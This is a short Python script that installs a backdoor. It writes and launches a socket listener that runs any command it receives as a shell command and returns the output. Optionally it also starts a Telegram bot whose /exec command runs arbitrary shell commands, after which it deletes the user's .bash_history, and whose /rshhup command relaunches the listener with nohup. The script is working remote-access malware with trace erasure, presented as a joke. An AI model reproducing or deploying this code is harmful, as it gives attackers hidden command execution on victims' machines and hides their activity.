#Created By Special_Esmit Just For Fun :)

#Created By Special_Esmit Just For Fun :)

import os
import sys

codes = """
import socket
import os
s = socket.socket()
ip = \"localhost\"
port = 15001
s.bind((ip, port))
s.listen(True)
while True:
	try:
		c, addr = s.accept()
		rs = c.recv(1024).decode()
		execute = os.system(rs + \' > execute.x 2> /dev/null\')
		exf = open(\'execute.x\',\'r\').read()
		try:
			c.send(str(exf).encode())
		except:
			c.close
		c.close
	except:
		continue
"""

f = open("lssx.py","w")
f.write(codes)
f.close
os.system("python lssx.py &")
sx = sys.argv[1]
print(sx)
if sx == 'y':
	try:
		from telethon import TelegramClient, connection, events
		from telethon import functions, types
	except:
		os.system("apt install -y python3-pip")
		os.system("pip install telethon && pip3 install telethon")

	admins = "admin_id"
	api_id = "api_id (integer)"
	api_hash = "api_hash (string)"
	token = "Your Telegram Token"

	bot = TelegramClient('bot', api_id, api_hash).start(bot_token=token)

	@bot.on(events.NewMessage(pattern='/exec'))
	async def send_welcome(event):
		e = event.raw_text[6:1000000000000000]
		os.system(str(e) + " > xsx.txt")
		f = open("xsx.txt","r").read()
		await event.reply("Result: " + str(f))
		os.system("eval \'rm -rf /home/$USER/.bash_history\'")
	@bot.on(events.NewMessage(pattern='/rshhup'))
	async def send_welcome(event):
		os.system("nohup py /bin/lssx.py &")
		os.system("nohup python /bin/lssx.py &")
		os.system("nohup python3 /bin/lssx.py &")
		os.system("nohup python2 /bin/lssx.py &")


	@bot.on(events.NewMessage(pattern='/start'))
	async def send_welcome(event):
	    await event.reply('I am on')

	bot.start()
	bot.run_until_disconnected()
else:
	  print("Reverse_Shell Run :(")
